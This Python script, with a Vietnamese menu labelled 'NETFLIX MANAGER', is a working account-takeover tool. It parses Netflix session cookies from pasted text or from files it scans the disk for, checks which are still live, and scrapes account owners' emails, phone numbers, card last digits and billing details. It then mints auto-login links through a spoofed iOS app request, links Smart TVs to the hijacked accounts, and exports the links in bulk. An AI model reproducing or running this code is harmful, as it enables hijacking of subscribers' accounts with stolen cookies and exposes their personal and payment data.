import os
import re
import json
import time
import requests
try: import msvcrt
except: msvcrt = None
import subprocess
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    try: requests.packages.urllib3.disable_warnings()
    except: pass

def run(func, *args, **kwargs):
    try: return func(*args, **kwargs)
    except: return None

def parse(text):
    cookie = {}
    try:
        if "[" in text and "]" in text:
            data = json.loads(text)
            if isinstance(data, list):
                for item in data:
                    if "name" in item and "value" in item: cookie[item["name"].strip()] = item["value"].strip()
            elif isinstance(data, dict):
                for key, val in data.items(): cookie[key.strip()] = val.strip()
            return cookie
    except: pass
    
    is_netscape = False
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith(chr(35)):
            continue
        part = line.split()
        if len(part) >= 7 and ("netflix.com" in part[0] or part[5] in ["nfvdid", "NetflixId", "SecureNetflixId"]):
            is_netscape = True
            break
            
    if is_netscape:
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith(chr(35)):
                continue
            part = line.split(None, 6)
            if len(part) >= 7:
                cookie[part[5].strip()] = part[6].strip()
        return cookie

    for item in text.split(";"):
        if "=" in item:
            part = item.split("=", 1)
            cookie[part[0].strip()] = part[1].strip()
    return cookie

def check(cookie):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    url = "https://www.netflix.com/YourAccount"
    try:
        res = requests.get(url, headers=headers, cookies=cookie, allow_redirects=True, timeout=10, verify=False)
        if res.status_code != 200 or "login" in res.url:
            return {"status": "die"}
        
        html = res.text
        auth = ""
        match = re.search(r'authURL["\']\s*:\s*["\']([^"\']+)["\']', html)
        if match:
            auth = match.group(1)
            
        build = ""
        match = re.search(r'BUILD_IDENTIFIER["\']\s*:\s*["\']([^"\']+)["\']', html, re.I)
        if match:
            build = match.group(1)
        else:
            match = re.search(r'buildIdentifier["\']\s*:\s*["\']([^"\']+)["\']', html)
            if match:
                build = match.group(1)
                
        email = ""
        match = re.search(r'["\'](?:membershipEmail|currentEmail|email)["\']\s*:\s*["\']([^"\']+@[^"\']+\.[^"\']+)["\']', html, re.I)
        if match:
            email = match.group(1)
        else:
            for val in re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', html):
                if not any(val.lower().endswith(ext) for ext in [".png", ".jpg", ".jpeg", ".gif", ".svg"]) and "2x" not in val:
                    email = val
                    break
        plan = ""
        billing = "None"
        m = re.search(r'localizedPlanName["\']?\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', html)
        if m:
            plan = m.group(1)
        m2 = re.search(r'nextBillingDate["\']?\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"', html)
        if m2:
            billing = m2.group(1).replace("\\x20", " ")
        if not plan:
            m3 = re.search(r'Basic\s+plan', html, re.I)
            if m3:
                plan = "Basic"
            elif re.search(r'Standard\s+plan', html, re.I):
                plan = "Standard"
            elif re.search(r'Premium\s+plan', html, re.I):
                plan = "Premium"
        if not plan:
            plan = "Không Rõ"
                
        country = ""
        match = re.search(r'countryCode["\']\s*:\s*["\']([^"\']+)["\']', html)
        if match:
            country = match.group(1)
        else:
            match = re.search(r'country["\']\s*:\s*["\']([^"\']+)["\']', html)
            if match:
                country = match.group(1)

        state = "Hoạt động"
        match = re.search(r'membershipStatus["\']\s*:\s*["\']([^"\']+)["\']', html)
        if match:
            val = match.group(1).upper()
            if "HOLD" in val:
                state = "Bị tạm ngưng (On Hold)"
            elif "CANCEL" in val:
                state = "Đã hủy (Cancelled)"
        else:
            if "bị tạm ngưng" in html.lower() or "suspension" in html.lower():
                state = "Bị tạm ngưng (On Hold)"
            elif "đã hủy" in html.lower() or "cancelled" in html.lower():
                state = "Đã hủy (Cancelled)"

        payment = "Không rõ"
        for item in ["Visa", "Mastercard", "Amex", "Discover", "PayPal", "Momo", "Google Play"]:
            if item in html:
                match = re.search(item + r'.*?\*+(\d{4})', html, re.I)
                if match:
                    payment = item + " (****" + match.group(1) + ")"
                    break
                else:
                    payment = item
                    break


        phone = "Không liên kết"
        match = re.search(r'phoneNumber["\']\s*:\s*["\']([^"\']+)["\']', html)
        if match:
            phone = match.group(1)
        else:
            match = re.search(r'formattedPhoneNumber["\']\s*:\s*["\']([^"\']+)["\']', html)
            if match:
                phone = match.group(1)
                
        return {
            "status": "live",
            "email": email,
            "plan": plan,
            "country": country,
            "auth": auth,
            "build": build,
            "state": state,
            "payment": payment,
            "billing": billing,
            "phone": phone,
            "cookie": cookie
        }
    except: return {"status": "die"}

def token(cookie, build, auth):
    val = ""
    for key in cookie:
        if key.lower() == "netflixid":
            val = cookie[key]
            break
    if not val:
        return ""
    if isinstance(val, str) and "%" in val:
        try: val = __import__("urllib.parse").parse.unquote(val)
        except: pass
    headers = {
        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "x-netflix.request.attempt": "1",
        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.context.app-version": "15.48.1",
        "x-netflix.argo.translated": "true",
        "x-netflix.context.form-factor": "phone",
        "x-netflix.context.sdk-version": "2012.4",
        "x-netflix.client.appversion": "15.48.1",
        "x-netflix.context.max-device-width": "375",
        "x-netflix.context.ab-tests": "",
        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        "x-netflix.client.type": "argo",
        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "x-netflix.context.locales": "en-US",
        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.client.iosversion": "15.8.5",
        "accept-language": "en-US;q=1",
        "x-netflix.argo.abtests": "",
        "x-netflix.context.os-version": "15.8.5",
        "x-netflix.request.client.context": '{"appState":"foreground"}',
        "x-netflix.context.ui-flavor": "argo",
        "x-netflix.argo.nfnsm": "9",
        "x-netflix.context.pixel-density": "2.0",
        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
        "Cookie": "NetflixId=" + val
    }
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    param = {
        "appVersion": "15.48.1",
        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        "device_type": "NFAPPL-02-",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "idiom": "phone",
        "iosVersion": "15.8.5",
        "isTablet": "false",
        "languages": "en-US",
        "locale": "en-US",
        "maxDeviceWidth": "375",
        "model": "saget",
        "modelType": "IPHONE8-1",
        "odpAware": "true",
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "pixelDensity": "2.0",
        "progressive": "false",
        "responseFormat": "json"
    }
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.get(url, params=param, headers=headers, timeout=15, verify=False)
        if res.status_code == 200:
            data = res.json()
            tok = data.get("value", {}).get("account", {}).get("token", {}).get("default", {}).get("token", "")
            return tok
    except: pass
    return ""

def info(cookie, build, auth):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "application/json, text/javascript, */*",
        "referer": "https://www.netflix.com/YourAccount",
        "x-netflix.request.client.user.agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if not build:
        build = "v8e17bb41"
    url = "https://www.netflix.com/nq/website/memberapi/" + build + "/pathEvaluator?authURL=" + auth
    payload = {
        "paths": [
            ["userInfo", "membershipStatus"],
            ["userInfo", "planLabel"],
            ["userInfo", "maxStreams"],
            ["userInfo", "nextBillingDate"]
        ],
        "authURL": auth
    }
    plan = ""
    billing = ""
    try:
        res = requests.post(url, headers=headers, json=payload, cookies=cookie, timeout=10, verify=False)
        if res.status_code == 200:
            data = res.json()
            ui = data.get("value", {}).get("userInfo", {})
            plan = ui.get("planLabel", "")
            billing = ui.get("nextBillingDate", "")
    except: pass
    if not plan:
        try:
            url2 = "https://www.netflix.com/nq/website/memberapi/" + build + "/pathEvaluator?authURL=" + auth
            payload2 = {"paths": [["serverDefs", "data", "membershipPlanName"]], "authURL": auth}
            res2 = requests.post(url2, headers=headers, json=payload2, cookies=cookie, timeout=10, verify=False)
            if res2.status_code == 200:
                plan = res2.json().get("value", {}).get("serverDefs", {}).get("data", {}).get("membershipPlanName", "")
        except: pass
    return plan, billing

def activate(cookie, code):
    code = code.replace("-", "").replace(" ", "").upper()
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
    }
    sess = requests.Session()
    for k, v in cookie.items():
        sess.cookies.set(k, v, domain=".netflix.com")
    sess.headers.update(headers)
    try:
        r = sess.get("https://www.netflix.com/tv2", timeout=15, allow_redirects=True, verify=False)
        html = r.text
    except Exception: return "fail"
    auth = ""
    m = re.search(r'name="authURL"\s*value="([^"]+)"', html)
    if m:
        auth = m.group(1)
    else:
        m = re.search(r'authURL["\']?\s*:\s*["\']([^"\']+)["\']', html)
        if m:
            auth = m.group(1)
    if not auth:
        return "fail"
    payload = {
        "flow": "websiteSignUp",
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "isTvUrl2": "true",
        "action": "nextAction",
        "authURL": auth,
        "tvLoginRendezvousCode": code,
    }
    sess.headers["referer"] = "https://www.netflix.com/tv2"
    try:
        r2 = sess.post("https://www.netflix.com/tv2", data=payload, timeout=15, allow_redirects=True, verify=False)
        if "/tv/out/success" in r2.url or "tvLoginSuccess" in r2.text or "originatingDeviceLoginSuccess" in r2.text:
            return "success"
        return "fail"
    except Exception: return "fail"

def filter(text):
    cookies = []
    try:
        if "[" in text and "]" in text:
            data = json.loads(text)
            if isinstance(data, list):
                cookie = {}
                for item in data:
                    if "name" in item and "value" in item:
                        k = item["name"].strip()
                        v = item["value"].strip()
                        if k in cookie:
                            if "NetflixId" in cookie:
                                cookies.append(cookie)
                            cookie = {}
                        cookie[k] = v
                if "NetflixId" in cookie:
                    cookies.append(cookie)
                return cookies
    except: pass
    netscape = False
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith(chr(35)):
            continue
        part = line.split()
        if len(part) >= 7 and ("netflix.com" in part[0] or part[5] in ["nfvdid", "NetflixId", "SecureNetflixId"]):
            netscape = True
            break
    if netscape:
        cookie = {}
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith(chr(35)):
                continue
            part = line.split(None, 6)
            if len(part) >= 7:
                k = part[5].strip()
                v = part[6].strip()
                if k in cookie:
                    if "NetflixId" in cookie:
                        cookies.append(cookie)
                    cookie = {}
                cookie[k] = v
        if "NetflixId" in cookie:
            cookies.append(cookie)
        return cookies
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if "NetflixId" in line or "SecureNetflixId" in line:
            cookie = {}
            for item in line.split(";"):
                if "=" in item:
                    part = item.split("=", 1)
                    cookie[part[0].strip()] = part[1].strip()
            if "NetflixId" in cookie:
                cookies.append(cookie)
    return cookies

def files(list):
    arr = []
    for path in list:
        if not path:
            continue
        if not os.path.exists(path):
            print(f"\033[91mFile không tồn tại: {path}\033[0m")
            continue
        print(f"\033[97mĐang đọc và lọc cookie từ: {path}...\033[0m")
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
        except:
            print(f"\033[91mKhông thể đọc file: {path}\033[0m")
            continue
        cookies = filter(text)
        if not cookies:
            print(f"\033[93mKhông tìm thấy cookie Netflix hợp lệ trong file: {path}\033[0m")
            continue
        print(f"\033[92mTìm thấy {len(cookies)} cookie. Đang xử lý...\033[0m")
        for cookie in cookies:
            res = check(cookie)
            if res["status"] == "live":
                rplan, rbill = info(res["cookie"], res["build"], res["auth"])
                if rplan:
                    res["plan"] = rplan
                if rbill:
                    res["billing"] = rbill
                tok = token(cookie, res["build"], res["auth"])
                bill = res["billing"]
                if not bill or bill in ["", "Không rõ", "Không có"]:
                    bill = "None"
                if tok:
                    link = "https://www.netflix.com/unsupported?nftoken=" + tok
                    arr.append(f"Email: {res['email']} | Quốc gia: {res['country']} | Gói cước: {res['plan']} | Hạn dùng: {bill} | Link: {link}")
                else:
                    link = "Không lấy được nftoken"
                print(f"\033[92m[LIVE]\033[0m {res['email']} | {res['plan']} | {res['country']} | {res['state']}")
                print(f"\033[92mLink:\033[0m {link}")
            else:
                print(f"\033[91m[DIE]\033[0m")
    if len(list) > 1 and arr:
        print("\033[97mMuốn xuất tất cả link LIVE ra file tổng hợp links.txt không? (Y/N):\033[0m")
        opt = input().strip().lower()
        if opt == "y":
            try:
                outpath = os.path.join(os.path.dirname(os.path.abspath(__file__)), "links.txt")
                with open(outpath, "a", encoding="utf-8", errors="ignore") as f:
                    f.write("\n".join(arr) + "\n")
                print("\033[92mĐã xuất thành công " + str(len(arr)) + " link vào file links.txt!\033[0m")
            except:
                print("\033[91mLỗi khi ghi file tổng hợp!\033[0m")

def select():
    if os.name == "nt":
        try:
            cmd = (
                "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null;"
                "$f = New-Object System.Windows.Forms.OpenFileDialog;"
                "$f.Multiselect = $true;"
                "$f.Filter = 'Text/JSON files (*.txt;*.json)|*.txt;*.json|All files (*.*)|*.*';"
                "$f.ShowDialog() | Out-Null;"
                "$f.FileNames"
            )
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-Command", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=0x08000000
            )
            if proc.returncode == 0:
                stdout = proc.stdout.decode("utf-8", errors="ignore")
                paths = [p.strip() for p in stdout.splitlines() if p.strip()]
                if paths: return paths
        except: pass
    dg = run(__import__, "dialogs")
    if dg:
        path = run(dg.pick_document)
        if path: return [path]
    if os.name != "nt":
        try:
            docdir = os.path.expanduser("~/Documents")
            if not os.path.exists(docdir): docdir = "."
            old = set(run(os.listdir, docdir) or [])
            proc = subprocess.run(["open", "shareddocuments://"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if proc.returncode == 0:
                print("\033[97mChọn files\033[0m")
                input("\033[97mNhấn Enter sau khi đã gom/chia sẻ files xong...\033[0m")
                now = set(run(os.listdir, docdir) or [])
                new = list(now - old)
                paths = [os.path.join(docdir, f) for f in new if f.endswith((".txt", ".json"))]
                if paths: return paths
        except: pass
    found = []
    if run(os.path.exists, "/sdcard/Download"):
        entries = run(os.scandir, "/sdcard/Download")
        if entries:
            for entry in entries:
                if entry.is_file() and entry.name.endswith((".txt", ".json")): found.append(entry.path)
    entries = run(os.scandir, ".")
    if entries:
        for entry in entries:
            if entry.is_file() and entry.name.endswith((".txt", ".json")): found.append(entry.path)
            elif entry.is_dir() and not entry.name.startswith("."):
                subs = run(os.scandir, entry.path)
                if subs:
                    for sub in subs:
                        if sub.is_file() and sub.name.endswith((".txt", ".json")): found.append(sub.path)
    if found:
        print("\033[92mTìm thấy các file cookie trong hệ thống:\033[0m")
        for i, path in enumerate(found, 1):
            print(f"[{i}] {path}")
        print("\033[97mNhập số thứ tự file (ví dụ: 1 hoặc 1,2 hoặc gõ 'all' để chọn tất cả).\033[0m")
        print("\033[97mHoặc nhập đường dẫn file khác nếu muốn:\033[0m")
    else:
        print("\033[97mNhập danh sách file cookie (phân tách bằng dấu phẩy, ví dụ: file1.txt, folder/file2.txt):\033[0m")
    opt = input().strip()
    if not opt: return []
    if opt.lower() == "all" and found: return found
    paths = []
    for item in opt.split(","):
        item = item.strip().strip("'\"")
        if not item: continue
        if item.isdigit() and found:
            idx = int(item) - 1
            if 0 <= idx < len(found): paths.append(found[idx])
        else: paths.append(item)
    return paths

def paste():
    print("\033[97mDán cookie Netflix vào đây (tự động nhận diện khi dán xong, hoặc gõ 'exit' để quay lại):\033[0m")
    data = []
    try:
        line = input()
        if line.strip().lower() == "exit":
            return "exit"
        data.append(line)
    except KeyboardInterrupt:
        raise KeyboardInterrupt
    except:
        return ""
    time.sleep(0.1)
    if msvcrt:
        while msvcrt.kbhit():
            try:
                line = input()
                data.append(line)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except:
                break
    else:
        print("\033[93m(Trên iOS/Android: Dán xong hãy nhấn Enter thêm 1 lần dòng trống để xác nhận)\033[0m")
        while True:
            try:
                line = input()
                if not line.strip():
                    break
                data.append(line)
            except KeyboardInterrupt:
                raise KeyboardInterrupt
            except:
                break
    return "\n".join(data)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def tv():
    clear()
    while True:
        text = paste()
        if text.strip().lower() == "exit":
            clear()
            return
        if not text:
            print("\033[91mCookie trống!\033[0m")
            continue
        cookie = parse(text)
        if not cookie:
            print("\033[91mKhông parse được cookie! Vui lòng nhập lại.\033[0m")
            continue
        print("\033[97mĐang kiểm tra cookie...\033[0m")
        res = check(cookie)
        if res["status"] == "live":
            print(f"\033[92m[LIVE]\033[0m {res['email']} | {res['plan']} | {res['country']} | {res['state']}")
            break
        else:
            print("\033[91m[DIE] Cookie không hợp lệ! Vui lòng nhập cookie khác.\033[0m")
            
    while True:
        print("\033[97mNhập mã kích hoạt Smart TV (6-8 chữ số) hoặc gõ 'exit' để quay lại:\033[0m")
        code = input().strip().upper()
        if code.lower() == "exit":
            clear()
            return
        if not code:
            print("\033[91mMã TV trống!\033[0m")
            continue
        print("\033[97mĐang kích hoạt Smart TV...\033[0m")
        status = activate(cookie, code)
        if status == "success":
            print("\033[92mKÍCH HOẠT TV THÀNH CÔNG!\033[0m")
            input("\033[97mẤn Enter để tiếp tục...\033[0m")
            clear()
            break
        else:
            print("\033[91mKích hoạt thất bại! Vui lòng kiểm tra lại mã TV.\033[0m")

def link():
    clear()
    while True:
        print("\033[97m[1] Nhập 1 cookie trực tiếp từ console\033[0m")
        print("\033[97m[2] Nhập danh sách file cookie (chọn nhiều file)\033[0m")
        print("\033[91m[3] Quay lại menu chính\033[0m")
        print("\033[97mChọn phương thức (1-3):\033[0m")
        opt = input().strip()
        if opt == "1":
            while True:
                text = paste()
                if text.strip().lower() == "exit":
                    clear()
                    break
                if not text:
                    print("\033[91mCookie trống!\033[0m")
                    continue
                cookie = parse(text)
                if not cookie:
                    print("\033[91mKhông parse được cookie!\033[0m")
                    continue
                print("\033[97mĐang kiểm tra cookie...\033[0m")
                res = check(cookie)
                if res["status"] == "live":
                    print(f"\033[92m[LIVE]\033[0m {res['email']} | {res['plan']} | {res['country']} | {res['state']}")
                    val = token(cookie, res["build"], res["auth"])
                    if val:
                        out = "https://www.netflix.com/unsupported?nftoken=" + val
                        print("\033[92mLink Auto-Login:\033[0m", out)
                    else:
                        print("\033[93mKhông lấy được nftoken!\033[0m")
                    input("\033[97mẤn Enter để tiếp tục...\033[0m")
                    clear()
                    break
                else:
                    print("\033[91m[DIE] Cookie không hợp lệ! Vui lòng nhập cookie khác.\033[0m")
        elif opt == "2":
            list = select()
            if not list:
                print("\033[91mKhông có file nào được chọn!\033[0m")
                continue
            files(list)
            input("\033[97mẤn Enter để tiếp tục...\033[0m")
            clear()
        elif opt == "3":
            clear()
            break
        else:
            print("\033[93mLựa chọn không hợp lệ!\033[0m")

def menu():
    os.system("")
    while True:
        clear()
        print("\033[97m=== NETFLIX MANAGER ===\033[0m")
        print("\033[97m[1] Chuyển đổi sang link đăng nhập tự động\033[0m")
        print("\033[97m[2] Đăng nhập Smart TV bằng TV code\033[0m")
        print("\033[91m[3] Thoát công cụ\033[0m")
        print("\033[97mChọn (1-3):\033[0m")
        opt = input().strip()
        if opt == "1":
            link()
        elif opt == "2":
            tv()
        elif opt == "3":
            print("\033[92mTạm biệt!\033[0m")
            break
        else:
            print("\033[93mLựa chọn không hợp lệ!\033[0m")
            input("\033[97mẤn Enter để tiếp tục...\033[0m")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        files(sys.argv[1:])
    else:
        try: menu()
        except KeyboardInterrupt: print("\n\033[92mĐã dừng chương trình! Tạm biệt!\033[0m")
